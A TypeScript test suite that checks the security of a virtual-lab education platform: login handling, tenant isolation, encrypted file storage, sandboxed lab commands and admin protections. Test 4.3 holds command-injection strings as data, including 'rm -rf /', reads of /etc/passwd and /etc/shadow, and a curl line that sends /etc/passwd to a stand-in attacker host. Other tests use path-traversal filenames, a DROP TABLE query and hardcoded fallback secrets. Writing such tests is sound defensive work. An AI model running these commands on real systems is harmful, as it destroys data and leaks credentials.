import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import jwt from 'jsonwebtoken';
import { createApp } from '../app';
import { prisma } from '../config/database';
import { UserStatus, Role } from '@prisma/client';
import { getStorageUploadDirectory } from '../services/storage.service';

const app = createApp();

describe('Phase 5: Security Hardening & Authorization Test Suite', () => {
  // Test entities
  let studentACookie: string;
  let studentAId: string;
  let studentAEmail: string;

  let studentBCookie: string;
  let studentBId: string;
  let studentBEmail: string;

  let adminCookie: string;
  let adminId: string;
  let adminEmail: string;

  let linuxLabId: string;
  let databaseLabId: string;

  let studentAFileId: string;
  let studentAStoredFileName: string;
  let studentAFolderId: string;

  const samplePlaintext = 'TopSecret-Exam-Paper-2026-Academic-Vault-Data';

  beforeAll(async () => {
    process.env.NODE_ENV = 'test';

    // 1. Register Student A
    studentAEmail = `sec_student_a_${Date.now()}@virtuallab.edu`;
    const regResA = await request(app)
      .post('/api/v1/auth/register')
      .send({
        firstName: 'Student',
        lastName: 'Alpha',
        email: studentAEmail,
        password: 'Password123!@#',
        studentId: `SEC-A-${Date.now()}`,
      });
    expect(regResA.status).toBe(201);
    studentAId = regResA.body.data.user.id;
    studentACookie = regResA.headers['set-cookie'][0];

    // 2. Register Student B
    studentBEmail = `sec_student_b_${Date.now()}@virtuallab.edu`;
    const regResB = await request(app)
      .post('/api/v1/auth/register')
      .send({
        firstName: 'Student',
        lastName: 'Beta',
        email: studentBEmail,
        password: 'Password123!@#',
        studentId: `SEC-B-${Date.now()}`,
      });
    expect(regResB.status).toBe(201);
    studentBId = regResB.body.data.user.id;
    studentBCookie = regResB.headers['set-cookie'][0];

    // 3. Login Root Admin
    adminEmail = process.env.ADMIN_EMAIL || 'admin@virtuallab.edu';
    const adminPassword = process.env.ADMIN_PASSWORD || 'AdminSecurePassword123!';
    const adminLoginRes = await request(app)
      .post('/api/v1/auth/login')
      .send({ email: adminEmail, password: adminPassword });
    expect(adminLoginRes.status).toBe(200);
    adminId = adminLoginRes.body.data.user.id;
    adminCookie = adminLoginRes.headers['set-cookie'][0];

    // 4. Retrieve Labs for testing
    const labs = await prisma.lab.findMany();
    const linux = labs.find((l) => l.category === 'LINUX');
    const db = labs.find((l) => l.category === 'DATABASE');
    linuxLabId = linux?.id || labs[0].id;
    databaseLabId = db?.id || labs[0].id;

    // 5. Setup Student A file & folder for multi-tenant and storage testing
    const uploadRes = await request(app)
      .post('/api/v1/storage/files/upload')
      .set('Cookie', studentACookie)
      .attach('file', Buffer.from(samplePlaintext), 'confidential_exam.txt');
    expect(uploadRes.status).toBe(201);
    studentAFileId = uploadRes.body.data.file.id;

    const fileInDb = await prisma.storedFile.findUnique({
      where: { id: studentAFileId },
    });
    studentAStoredFileName = fileInDb!.storedName;

    const folderRes = await request(app)
      .post('/api/v1/storage/folders')
      .set('Cookie', studentACookie)
      .send({ name: 'Alpha-Private-Folder' });
    expect(folderRes.status).toBe(201);
    studentAFolderId = folderRes.body.data.folder.id;
  });

  afterAll(async () => {
    try {
      const uploadDir = getStorageUploadDirectory();
      const files = await prisma.storedFile.findMany({
        where: { userId: { in: [studentAId, studentBId] } },
      });
      for (const f of files) {
        const p = path.join(uploadDir, f.storedName);
        if (fs.existsSync(p)) fs.unlinkSync(p);
      }

      await prisma.user.deleteMany({
        where: { id: { in: [studentAId, studentBId] } },
      });
      await prisma.$disconnect();
    } catch {
      // Ignore teardown error
    }
  });

  // =========================================================================
  // MODULE 1: AUTHENTICATION SECURITY
  // =========================================================================
  describe('MODULE 1: Authentication Security', () => {
    it('1.1: Rejects login with incorrect password with generic error message (401)', async () => {
      const res = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: studentAEmail, password: 'WrongPassword999!' });

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toBe('Invalid email or password.');
    });

    it('1.2: Rejects login with non-existent email preventing user enumeration (401)', async () => {
      const res = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: 'ghost_nonexistent_user@virtuallab.edu', password: 'Password123!' });

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toBe('Invalid email or password.');
    });

    it('1.3: Confirms HTTP-only cookie configuration upon login', async () => {
      const res = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: studentAEmail, password: 'Password123!@#' });

      expect(res.status).toBe(200);
      const setCookie = res.headers['set-cookie'];
      expect(setCookie).toBeDefined();
      const cookieStr = setCookie[0];
      expect(cookieStr).toContain('HttpOnly');
      expect(cookieStr).toContain('Path=/');
    });

    it('1.4: Rejects requests with an expired JWT token (401)', async () => {
      const secret =
        process.env.JWT_SECRET || 'super_secret_jwt_signing_key_change_in_production_min32chars';
      // Create token that expired 1 hour ago
      const expiredToken = jwt.sign(
        { userId: studentAId, email: studentAEmail, role: Role.STUDENT },
        secret,
        { expiresIn: '-1h' }
      );

      const res = await request(app)
        .get('/api/v1/auth/me')
        .set('Cookie', `token=${expiredToken}`);

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Invalid or expired authentication session');
    });

    it('1.5: Rejects requests with a tampered JWT signature (401)', async () => {
      // Sign with an illegitimate secret
      const forgedToken = jwt.sign(
        { userId: studentAId, email: studentAEmail, role: Role.ADMIN },
        'attacker_fake_signing_key_not_the_server_secret'
      );

      const res = await request(app)
        .get('/api/v1/auth/me')
        .set('Cookie', `token=${forgedToken}`);

      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Invalid');
    });

    it('1.6: Blocks login and authenticated access for SUSPENDED accounts (403)', async () => {
      // Temporarily suspend Student B
      await prisma.user.update({
        where: { id: studentBId },
        data: { status: UserStatus.SUSPENDED },
      });

      // Attempt login
      const loginRes = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: studentBEmail, password: 'Password123!@#' });

      expect(loginRes.status).toBe(403);
      expect(loginRes.body.success).toBe(false);
      expect(loginRes.body.message).toContain('Account access blocked');
      expect(loginRes.body.message).toContain('suspended');

      // Attempt authenticated access with existing cookie
      const authRes = await request(app)
        .get('/api/v1/auth/me')
        .set('Cookie', studentBCookie);

      expect(authRes.status).toBe(403);
      expect(authRes.body.success).toBe(false);

      // Restore Student B
      await prisma.user.update({
        where: { id: studentBId },
        data: { status: UserStatus.ACTIVE },
      });
    });

    it('1.7: Blocks login for INACTIVE accounts (403)', async () => {
      await prisma.user.update({
        where: { id: studentBId },
        data: { status: UserStatus.INACTIVE },
      });

      const loginRes = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: studentBEmail, password: 'Password123!@#' });

      expect(loginRes.status).toBe(403);
      expect(loginRes.body.success).toBe(false);
      expect(loginRes.body.message).toContain('Account access blocked');

      await prisma.user.update({
        where: { id: studentBId },
        data: { status: UserStatus.ACTIVE },
      });
    });

    it('1.8: Verifies password hashing uses strong bcrypt rounds (salt $2a$ or $2b$)', async () => {
      const user = await prisma.user.findUnique({
        where: { id: studentAId },
        select: { passwordHash: true },
      });
      expect(user).toBeDefined();
      expect(user!.passwordHash).toMatch(/^\$2[ab]\$12\$/);
    });

    it('1.9: Verifies password-change rejects incorrect current password (400)', async () => {
      const res = await request(app)
        .post('/api/v1/auth/change-password')
        .set('Cookie', studentACookie)
        .send({
          currentPassword: 'IncorrectOldPassword!',
          newPassword: 'BrandNewSecurePassword123!',
          confirmPassword: 'BrandNewSecurePassword123!',
        });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Current password is incorrect');
    });

    it('1.10: Verifies successful password change allows login with new password and revokes old password', async () => {
      const changeRes = await request(app)
        .post('/api/v1/auth/change-password')
        .set('Cookie', studentACookie)
        .send({
          currentPassword: 'Password123!@#',
          newPassword: 'BrandNewSecurePassword123!',
          confirmPassword: 'BrandNewSecurePassword123!',
        });

      expect(changeRes.status).toBe(200);
      expect(changeRes.body.success).toBe(true);

      // Old password fails
      const oldLogin = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: studentAEmail, password: 'Password123!@#' });
      expect(oldLogin.status).toBe(401);

      // New password succeeds
      const newLogin = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: studentAEmail, password: 'BrandNewSecurePassword123!' });
      expect(newLogin.status).toBe(200);

      // Re-assign active student cookie with new session
      studentACookie = newLogin.headers['set-cookie'][0];
    });
  });

  // =========================================================================
  // MODULE 2: MULTI-TENANT ISOLATION
  // =========================================================================
  describe('MODULE 2: Multi-Tenant Isolation', () => {
    it('2.1: Student B cannot view Student A file metadata (403 Forbidden)', async () => {
      const res = await request(app)
        .get(`/api/v1/storage/files/${studentAFileId}`)
        .set('Cookie', studentBCookie);

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Forbidden');
    });

    it('2.2: Student B cannot download Student A file (403 Forbidden)', async () => {
      const res = await request(app)
        .get(`/api/v1/storage/files/${studentAFileId}/download`)
        .set('Cookie', studentBCookie);

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Forbidden');
    });

    it('2.3: Student B cannot rename Student A file (403 Forbidden)', async () => {
      const res = await request(app)
        .patch(`/api/v1/storage/files/${studentAFileId}`)
        .set('Cookie', studentBCookie)
        .send({ name: 'tampered_name.txt' });

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
    });

    it('2.4: Student B cannot move Student A file (403 Forbidden)', async () => {
      const res = await request(app)
        .patch(`/api/v1/storage/files/${studentAFileId}/move`)
        .set('Cookie', studentBCookie)
        .send({ targetFolderId: null });

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
    });

    it('2.5: Student B cannot delete Student A file (403 Forbidden)', async () => {
      const res = await request(app)
        .delete(`/api/v1/storage/files/${studentAFileId}`)
        .set('Cookie', studentBCookie);

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);

      // Verify file is still present in DB
      const fileStillExists = await prisma.storedFile.findUnique({
        where: { id: studentAFileId },
      });
      expect(fileStillExists).not.toBeNull();
    });

    it('2.6: Student B cannot upload files into Student A private folder (404/403)', async () => {
      const res = await request(app)
        .post('/api/v1/storage/files/upload')
        .set('Cookie', studentBCookie)
        .field('folderId', studentAFolderId)
        .attach('file', Buffer.from('Intruder data'), 'intruder.txt');

      expect([403, 404]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('2.7: Student B cannot inspect Student A lab session (403 Forbidden)', async () => {
      // Student A starts a session
      const startRes = await request(app)
        .post(`/api/v1/labs/${linuxLabId}/sessions`)
        .set('Cookie', studentACookie);
      expect([200, 201]).toContain(startRes.status);
      const sessionAId = startRes.body.data.session.id;

      // Student B attempts to get session details
      const viewRes = await request(app)
        .get(`/api/v1/labs/sessions/${sessionAId}`)
        .set('Cookie', studentBCookie);

      expect(viewRes.status).toBe(403);
      expect(viewRes.body.success).toBe(false);
    });

    it('2.8: Student B cannot execute commands in Student A lab session (403 Forbidden)', async () => {
      const startRes = await request(app)
        .post(`/api/v1/labs/${linuxLabId}/sessions`)
        .set('Cookie', studentACookie);
      const sessionAId = startRes.body.data.session.id;

      const execRes = await request(app)
        .post(`/api/v1/labs/sessions/${sessionAId}/execute`)
        .set('Cookie', studentBCookie)
        .send({ command: 'ls' });

      expect(execRes.status).toBe(403);
      expect(execRes.body.success).toBe(false);
    });

    it('2.9: Student B cannot terminate/end Student A lab session (403 Forbidden)', async () => {
      const startRes = await request(app)
        .post(`/api/v1/labs/${linuxLabId}/sessions`)
        .set('Cookie', studentACookie);
      const sessionAId = startRes.body.data.session.id;

      const endRes = await request(app)
        .post(`/api/v1/labs/sessions/${sessionAId}/end`)
        .set('Cookie', studentBCookie);

      expect(endRes.status).toBe(403);
      expect(endRes.body.success).toBe(false);
    });

    it('2.10: Students are strictly blocked from all administrative endpoints (403 Forbidden)', async () => {
      const adminEndpoints = [
        { method: 'get', url: '/api/v1/admin/dashboard' },
        { method: 'get', url: '/api/v1/admin/users' },
        { method: 'get', url: '/api/v1/admin/storage/overview' },
        { method: 'get', url: '/api/v1/admin/audit-logs' },
        { method: 'get', url: '/api/v1/admin/activities' },
        { method: 'get', url: '/api/v1/admin/labs/governance' },
      ];

      for (const ep of adminEndpoints) {
        const res = await (request(app) as any)[ep.method](ep.url).set('Cookie', studentACookie);
        expect(res.status).toBe(403);
        expect(res.body.success).toBe(false);
      }
    });
  });

  // =========================================================================
  // MODULE 3: SECURE STORAGE TESTING
  // =========================================================================
  describe('MODULE 3: Secure Storage Testing', () => {
    it('3.1: Rejects dangerous executable extensions (.exe, .bat, .sh, .msi, .ps1) (400)', async () => {
      const dangerousNames = [
        'trojan.exe',
        'script.bat',
        'malware.sh',
        'installer.msi',
        'backdoor.ps1',
      ];

      for (const name of dangerousNames) {
        const res = await request(app)
          .post('/api/v1/storage/files/upload')
          .set('Cookie', studentACookie)
          .attach('file', Buffer.from('echo dangerous'), name);

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.message).toContain('prohibited for security');
      }
    });

    it('3.2: Rejects file uploads that exceed user allocated storage quota (400)', async () => {
      // Temporarily set Student B quota to 500 bytes
      await prisma.user.update({
        where: { id: studentBId },
        data: { storageQuotaBytes: BigInt(500) },
      });

      // Try uploading a 1 KB file
      const res = await request(app)
        .post('/api/v1/storage/files/upload')
        .set('Cookie', studentBCookie)
        .attach('file', Buffer.alloc(1024, 'A'), 'oversized_for_quota.txt');

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Storage quota exceeded');

      // Restore quota
      await prisma.user.update({
        where: { id: studentBId },
        data: { storageQuotaBytes: BigInt(100 * 1024 * 1024) },
      });
    });

    it('3.3: Sanitizes path traversal attempts in uploaded file originalName', async () => {
      const res = await request(app)
        .post('/api/v1/storage/files/upload')
        .set('Cookie', studentACookie)
        .attach('file', Buffer.from('traversal content'), '../../../../etc/passwd.txt');

      expect(res.status).toBe(201);
      // originalName must be stripped of traversal path
      expect(res.body.data.file.originalName).toBe('passwd.txt');
    });

    it('3.4: Rejects path traversal characters in rename operations (400 Zod error)', async () => {
      const res = await request(app)
        .patch(`/api/v1/storage/files/${studentAFileId}`)
        .set('Cookie', studentACookie)
        .send({ name: '../../evil_renamed.txt' });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(JSON.stringify(res.body)).toContain('illegal characters');
    });

    it('3.5: Rejects path traversal characters in folder creation (400 Zod error)', async () => {
      const res = await request(app)
        .post('/api/v1/storage/folders')
        .set('Cookie', studentACookie)
        .send({ name: '../folder_traversal' });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(JSON.stringify(res.body)).toContain('illegal characters');
    });

    it('3.6: Verifies ciphertext on disk is fully encrypted and never contains plaintext (AES-256-GCM at-rest)', async () => {
      const uploadDir = getStorageUploadDirectory();
      const storedPath = path.join(uploadDir, studentAStoredFileName);

      expect(fs.existsSync(storedPath)).toBe(true);
      const rawEncryptedDiskBytes = fs.readFileSync(storedPath);

      // Ciphertext on disk must NOT contain the plaintext string
      expect(rawEncryptedDiskBytes.includes(Buffer.from(samplePlaintext))).toBe(false);
    });

    it('3.7: Detects and rejects AES-GCM ciphertext tampering (400 Decryption failed)', async () => {
      // Upload a test file specifically for tampering
      const uploadRes = await request(app)
        .post('/api/v1/storage/files/upload')
        .set('Cookie', studentACookie)
        .attach('file', Buffer.from('Tamper-Test-Plaintext'), 'tamper_test.txt');

      const fileId = uploadRes.body.data.file.id;
      const fileDb = await prisma.storedFile.findUnique({ where: { id: fileId } });

      const uploadDir = getStorageUploadDirectory();
      const storedPath = path.join(uploadDir, fileDb!.storedName);

      // Corrupt a single byte in ciphertext on disk
      const originalBytes = fs.readFileSync(storedPath);
      const corruptedBytes = Buffer.from(originalBytes);
      corruptedBytes[0] = corruptedBytes[0] ^ 0xff; // Flip bits in first byte
      fs.writeFileSync(storedPath, corruptedBytes);

      // Attempt download of corrupted file
      const downloadRes = await request(app)
        .get(`/api/v1/storage/files/${fileId}/download`)
        .set('Cookie', studentACookie);

      expect(downloadRes.status).toBe(400);
      expect(downloadRes.body.success).toBe(false);
      expect(downloadRes.body.message).toContain('Integrity verification failed');

      // Cleanup
      await prisma.storedFile.delete({ where: { id: fileId } });
      if (fs.existsSync(storedPath)) fs.unlinkSync(storedPath);
    });

    it('3.8: Detects and rejects AES-GCM authentication tag tampering in database (400)', async () => {
      const uploadRes = await request(app)
        .post('/api/v1/storage/files/upload')
        .set('Cookie', studentACookie)
        .attach('file', Buffer.from('Tag-Tamper-Plaintext'), 'tag_tamper.txt');

      const fileId = uploadRes.body.data.file.id;
      const fileDb = await prisma.storedFile.findUnique({ where: { id: fileId } });
      const uploadDir = getStorageUploadDirectory();
      const storedPath = path.join(uploadDir, fileDb!.storedName);

      // Tamper with the authTag in DB
      await prisma.storedFile.update({
        where: { id: fileId },
        data: { authTag: '00112233445566778899aabbccddeeff' },
      });

      const downloadRes = await request(app)
        .get(`/api/v1/storage/files/${fileId}/download`)
        .set('Cookie', studentACookie);

      expect(downloadRes.status).toBe(400);
      expect(downloadRes.body.success).toBe(false);
      expect(downloadRes.body.message).toContain('Integrity verification failed');

      // Cleanup
      await prisma.storedFile.delete({ where: { id: fileId } });
      if (fs.existsSync(storedPath)) fs.unlinkSync(storedPath);
    });

    it('3.9: Verifies master encryption key and raw secrets are never exposed in API responses', async () => {
      const detailsRes = await request(app)
        .get(`/api/v1/storage/files/${studentAFileId}`)
        .set('Cookie', studentACookie);

      const jsonStr = JSON.stringify(detailsRes.body);
      const secretKey =
        process.env.STORAGE_ENCRYPTION_SECRET ||
        '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';

      expect(jsonStr).not.toContain(secretKey);
      expect(detailsRes.body.data.file).not.toHaveProperty('encryptionIv');
      expect(detailsRes.body.data.file).not.toHaveProperty('authTag');
      expect(detailsRes.body.data.file).not.toHaveProperty('storedName');
    });

    it('3.10: Verifies file deletion cleans up ciphertext from disk and database', async () => {
      // Upload temporary file to delete
      const uploadRes = await request(app)
        .post('/api/v1/storage/files/upload')
        .set('Cookie', studentACookie)
        .attach('file', Buffer.from('Temporary file to be deleted'), 'delete_me.txt');

      const fileId = uploadRes.body.data.file.id;
      const fileDb = await prisma.storedFile.findUnique({ where: { id: fileId } });
      const uploadDir = getStorageUploadDirectory();
      const storedPath = path.join(uploadDir, fileDb!.storedName);

      expect(fs.existsSync(storedPath)).toBe(true);

      // Delete file
      const deleteRes = await request(app)
        .delete(`/api/v1/storage/files/${fileId}`)
        .set('Cookie', studentACookie);

      expect(deleteRes.status).toBe(200);

      // Verify removed from disk
      expect(fs.existsSync(storedPath)).toBe(false);

      // Verify removed from database
      const dbCheck = await prisma.storedFile.findUnique({ where: { id: fileId } });
      expect(dbCheck).toBeNull();
    });
  });

  // =========================================================================
  // MODULE 4: VIRTUAL LAB SECURITY
  // =========================================================================
  describe('MODULE 4: Virtual Lab Security', () => {
    let activeSessionId: string;

    beforeAll(async () => {
      const startRes = await request(app)
        .post(`/api/v1/labs/${linuxLabId}/sessions`)
        .set('Cookie', studentACookie);
      activeSessionId = startRes.body.data.session.id;
    });

    it('4.1: Safely handles unknown commands with educational error message', async () => {
      const res = await request(app)
        .post(`/api/v1/labs/sessions/${activeSessionId}/execute`)
        .set('Cookie', studentACookie)
        .send({ command: 'unknown_dangerous_cmd_123' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.output).toContain('command not found');
      expect(res.body.data.output).toContain('Type \'help\' to see safe allowlisted commands');
    });

    it('4.2: Rejects oversized command input via Zod validation (>2000 chars) (400)', async () => {
      const oversizedCmd = 'echo ' + 'A'.repeat(2500);

      const res = await request(app)
        .post(`/api/v1/labs/sessions/${activeSessionId}/execute`)
        .set('Cookie', studentACookie)
        .send({ command: oversizedCmd });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(JSON.stringify(res.body)).toContain('Command exceeds maximum length limit');
    });

    it('4.3: Defends against command injection attempts (; rm -rf /, &&, |, $(id), backticks)', async () => {
      const injectionAttempts = [
        '; rm -rf /',
        'ls && cat /etc/passwd',
        'echo "test" | id',
        'echo $(whoami)',
        '`cat /etc/shadow`',
        'curl http://attacker.com/steal?data=$(cat /etc/passwd)',
      ];

      for (const cmd of injectionAttempts) {
        const res = await request(app)
          .post(`/api/v1/labs/sessions/${activeSessionId}/execute`)
          .set('Cookie', studentACookie)
          .send({ command: cmd });

        expect(res.status).toBe(200);
        // Commands are parsed literally; no host execution occurs
        expect(res.body.success).toBe(true);
      }
    });

    it('4.4: Prevents host OS commands execution (dir, cmd, powershell, systeminfo)', async () => {
      const hostCommands = ['cmd.exe /c whoami', 'powershell.exe Get-Process', 'systeminfo'];

      for (const cmd of hostCommands) {
        const res = await request(app)
          .post(`/api/v1/labs/sessions/${activeSessionId}/execute`)
          .set('Cookie', studentACookie)
          .send({ command: cmd });

        expect(res.status).toBe(200);
        expect(res.body.data.output).toContain('command not found');
      }
    });

    it('4.5: Verifies SQL playground is isolated in memory and cannot access real PostgreSQL tables', async () => {
      const dbStartRes = await request(app)
        .post(`/api/v1/labs/${databaseLabId}/sessions`)
        .set('Cookie', studentACookie);

      const dbSessionId = dbStartRes.body.data.session.id;

      // Attempt SQL query targeting real PostgreSQL "User" table
      const res = await request(app)
        .post(`/api/v1/labs/sessions/${dbSessionId}/execute`)
        .set('Cookie', studentACookie)
        .send({ command: 'SELECT * FROM "User";' });

      expect(res.status).toBe(200);
      // Does not query the real User table
      expect(res.body.data.output).not.toContain(adminEmail);
      expect(res.body.data.output).not.toContain('passwordHash');

      // Attempt DROP TABLE
      const dropRes = await request(app)
        .post(`/api/v1/labs/sessions/${dbSessionId}/execute`)
        .set('Cookie', studentACookie)
        .send({ command: 'DROP TABLE "User";' });

      expect(dropRes.status).toBe(200);

      // Verify real "User" table in PostgreSQL was NOT dropped
      const userCount = await prisma.user.count();
      expect(userCount).toBeGreaterThanOrEqual(1);
    });

    it('4.6: Rejects command execution on an already closed/completed session (400)', async () => {
      // End session
      const endRes = await request(app)
        .post(`/api/v1/labs/sessions/${activeSessionId}/end`)
        .set('Cookie', studentACookie);
      expect(endRes.status).toBe(200);

      // Attempt command execution on ended session
      const execRes = await request(app)
        .post(`/api/v1/labs/sessions/${activeSessionId}/execute`)
        .set('Cookie', studentACookie)
        .send({ command: 'pwd' });

      expect(execRes.status).toBe(400);
      expect(execRes.body.success).toBe(false);
      expect(execRes.body.message).toContain('already closed');
    });
  });

  // =========================================================================
  // MODULE 5: ADMIN GOVERNANCE SECURITY
  // =========================================================================
  describe('MODULE 5: Admin Governance Security', () => {
    it('5.1: Unauthenticated requests to admin endpoints return 401 Unauthorized', async () => {
      const res = await request(app).get('/api/v1/admin/dashboard');
      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
    });

    it('5.2: Student cannot adjust storage quotas (403 Forbidden)', async () => {
      const res = await request(app)
        .patch(`/api/v1/admin/storage/users/${studentBId}/quota`)
        .set('Cookie', studentACookie)
        .send({ quotaBytes: 500 * 1024 * 1024 });

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
    });

    it('5.3: Student cannot alter user role assignments (403 Forbidden)', async () => {
      const res = await request(app)
        .patch(`/api/v1/admin/users/${studentAId}/role`)
        .set('Cookie', studentACookie)
        .send({ role: Role.ADMIN });

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
    });

    it('5.4: Administrator cannot deactivate their own account (Self-Protection Rule) (400)', async () => {
      const res = await request(app)
        .patch(`/api/v1/admin/users/${adminId}/status`)
        .set('Cookie', adminCookie)
        .send({ status: UserStatus.INACTIVE });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Self-protection rule violation');
    });

    it('5.5: Administrator cannot alter their own role (Self-Protection Rule) (400)', async () => {
      const res = await request(app)
        .patch(`/api/v1/admin/users/${adminId}/role`)
        .set('Cookie', adminCookie)
        .send({ role: Role.STUDENT });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Self-protection rule violation');
    });

    it('5.6: Administrator cannot deactivate primary root administrator account (Root Protection Rule) (400)', async () => {
      // Find root admin ID
      const rootAdmin = await prisma.user.findUnique({
        where: { email: 'admin@virtuallab.edu' },
      });

      if (rootAdmin) {
        // Create secondary temporary admin
        const secAdminEmail = `secondary_admin_${Date.now()}@virtuallab.edu`;
        const salt = await require('bcryptjs').genSalt(12);
        const hash = await require('bcryptjs').hash('Password123!', salt);
        const secAdmin = await prisma.user.create({
          data: {
            email: secAdminEmail,
            firstName: 'Secondary',
            lastName: 'Admin',
            passwordHash: hash,
            role: Role.ADMIN,
            status: UserStatus.ACTIVE,
          },
        });

        const secLogin = await request(app)
          .post('/api/v1/auth/login')
          .send({ email: secAdminEmail, password: 'Password123!' });
        const secAdminCookie = secLogin.headers['set-cookie'][0];

        // Secondary admin attempts to deactivate root admin
        const attackRes = await request(app)
          .patch(`/api/v1/admin/users/${rootAdmin.id}/status`)
          .set('Cookie', secAdminCookie)
          .send({ status: UserStatus.INACTIVE });

        expect(attackRes.status).toBe(400);
        expect(attackRes.body.success).toBe(false);
        expect(attackRes.body.message).toContain('System protection rule violation');

        // Secondary admin attempts to change root admin's role
        const roleAttackRes = await request(app)
          .patch(`/api/v1/admin/users/${rootAdmin.id}/role`)
          .set('Cookie', secAdminCookie)
          .send({ role: Role.STUDENT });

        expect(roleAttackRes.status).toBe(400);
        expect(roleAttackRes.body.success).toBe(false);
        expect(roleAttackRes.body.message).toContain('System protection rule violation');

        // Cleanup secondary admin
        await prisma.user.delete({ where: { id: secAdmin.id } });
      }
    });

    it('5.7: Administrative status modifications generate immutable PostgreSQL AuditLog records', async () => {
      // Admin deactivates Student B
      const updateRes = await request(app)
        .patch(`/api/v1/admin/users/${studentBId}/status`)
        .set('Cookie', adminCookie)
        .send({ status: UserStatus.INACTIVE });

      expect(updateRes.status).toBe(200);

      // Verify AuditLog was recorded
      const auditEntry = await prisma.auditLog.findFirst({
        where: {
          adminId,
          targetEntity: 'USER',
          targetId: studentBId,
          action: 'UPDATE_USER_STATUS',
        },
        orderBy: { createdAt: 'desc' },
      });

      expect(auditEntry).toBeDefined();
      expect(auditEntry!.previousVal).toContain('ACTIVE');
      expect(auditEntry!.newVal).toContain('INACTIVE');

      // Re-activate Student B
      await request(app)
        .patch(`/api/v1/admin/users/${studentBId}/status`)
        .set('Cookie', adminCookie)
        .send({ status: UserStatus.ACTIVE });
    });
  });
});
